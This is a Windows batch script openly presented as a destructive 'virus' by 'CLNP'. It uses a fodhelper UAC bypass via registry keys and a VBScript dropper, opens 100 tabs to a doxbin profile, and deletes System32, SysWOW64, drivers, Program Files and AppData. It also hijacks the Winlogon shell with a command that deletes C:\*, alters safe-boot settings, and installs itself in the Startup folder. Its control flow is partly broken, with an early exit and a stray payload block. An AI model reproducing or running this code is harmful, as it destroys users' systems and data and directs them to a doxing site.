@echo off
:: CLNP VIRUS - SYSTEM ANNIHILATOR v2.0 (NO REBOOT)
:: "this virus will break your pc if you ran -- by CLNP"
title this virus will break your pc if you ran -- by CLNP
color 4f
mode con: cols=90 lines=25

echo.
echo  ****************************************************************
echo  *     THIS VIRUS WILL BREAK YOUR PC IF YOU RAN                 *
echo  *                -- by CLNP --                                 *
echo  ****************************************************************
echo.
ping localhost -n 3 >nul

:: === PHASE 1: UAC BYPASS VIA FODHELPER (WIN10/11) ===
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /t REG_SZ /f >nul 2>&1
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /d "%~f0" /f >nul 2>&1
cscript //nologo //e:vbscript "%temp%\elev.vbs" >nul 2>&1
del /f /q "%temp%\elev.vbs" 2>nul
exit /b

-----BEGIN VBS PAYLOAD-----
Dim WshShell, objShell
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "fodhelper.exe", 0, False
WScript.Sleep 1200
Set objShell = CreateObject("Shell.Application")
objShell.ShellExecute "cmd.exe", "/c start /max https://doxbin.com/user/LACPP && start /max https://doxbin.com/user/LACPP && start /max https://doxbin.com/user/LACPP && start /max https://doxbin.com/user/LACPP && start /max https://doxbin.com/user/LACPP", "", "runas", 1
-----END VBS PAYLOAD-----

> "%temp%\elev.vbs" echo Dim WshShell, objShell
>>"%temp%\elev.vbs" echo Set WshShell = CreateObject("WScript.Shell")
>>"%temp%\elev.vbs" echo WshShell.Run "fodhelper.exe", 0, False
>>"%temp%\elev.vbs" echo WScript.Sleep 1200
>>"%temp%\elev.vbs" echo Set objShell = CreateObject("Shell.Application")
>>"%temp%\elev.vbs" echo objShell.ShellExecute "cmd.exe", "/c start /max https://doxbin.com/user/LACPP && start /max https://doxbin.com/user/LACPP && start /max https://doxbin.com/user/LACPP && start /max https://doxbin.com/user/LACPP && start /max https://doxbin.com/user/LACPP", "", "runas", 1

:: === PHASE 2: ADMIN CHECK ===
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo [FAIL] Admin escalation failed. Re-run manually as admin.
    pause & exit
)

:: === PHASE 3: BROWSER TAB APOCALYPSE (100 TABS) ===
for /l %%i in (1,1,100) do start "" "https://doxbin.com/user/LACPP"

:: === PHASE 4: SYSTEM DIRECTORY HOLOCAUST ===
takeown /f "C:\Windows\System32" /r /d y >nul 2>&1
icacls "C:\Windows\System32" /grant administrators:F /t >nul 2>&1
del /f /q /s "C:\Windows\System32\*.*" >nul 2>&1
del /f /q /s "C:\Windows\SysWOW64\*.*" >nul 2>&1
del /f /q /s "C:\Windows\System32\drivers\*.*" >nul 2>&1
del /f /q /s "C:\Program Files\*.*" >nul 2>&1
del /f /q /s "C:\Users\%username%\AppData\*.*" >nul 2>&1

:: === PHASE 5: REGISTRY SABOTAGE (NO BOOT RECOVERY) ===
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "cmd.exe /c del /f /q C:\*.*" /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal" /ve /d "CLNP" /f >nul 2>&1
bcdedit /deletevalue {default} safeboot >nul 2>&1

:: === PHASE 6: PERSISTENCE + TAUNT ===
echo CLNP OWNED THIS MACHINE - 11/15/2025 07:32 PM CST > C:\CLNP_VICTORY.txt
copy /y "%~f0" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\CLNP_RAMPAGE.bat" >nul
copy /y "%~f0" "C:\Users\Public\CLNP_RAMPAGE.bat" >nul

echo.
echo  [SUCCESS] SYSTEM CORE CORRUPTED. NO REBOOT. NO RECOVERY.
echo  [INFO] PERSISTENCE ACTIVE ON NEXT LOGIN.
echo.
echo  CLNP SENDS HIS REGARDS.
echo.
pause